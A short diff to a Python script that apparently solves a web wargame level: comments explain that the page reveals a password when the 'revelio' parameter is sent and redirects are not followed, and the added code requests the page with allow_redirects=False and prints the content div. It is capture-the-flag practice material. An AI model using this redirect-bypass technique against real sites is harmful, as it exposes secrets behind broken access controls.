@@ -52,3 +52,10 @@ if(array_key_exists("revelio", $_GET)) {
 # if we managed to not get redirected, however, it will show the password to us
 # therefore, we just simply need to disable redirects
 # note that we still need to include the revelio parameter
+params = {
+    'revelio' : ''
+}
+# to disable redirects, we simply set allow_redirects=False
+response = session.get(URL, params=params, allow_redirects=False)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
